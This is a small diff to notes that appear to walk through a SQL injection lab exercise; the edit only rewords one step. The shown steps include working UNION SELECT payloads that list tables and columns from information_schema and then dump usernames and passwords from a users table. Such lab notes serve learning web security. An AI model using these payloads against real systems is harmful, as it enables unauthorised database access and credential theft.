@@ -22,7 +22,7 @@ Analysis:
 5. Edit the request and send through repeater.
 6. Determine the number of column
 7. Try '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- to get names of tables 
-8. TryUNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ctmquy'-- To get Table Names
+8. TryUNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ctmquy'-- To get to get names of the columns containing usernames and passwords
 9. Try '+UNION+SELECT+username_sgefku,+password_dycmtm+FROM+users_ctmquy-- to get the content of tables
 
 
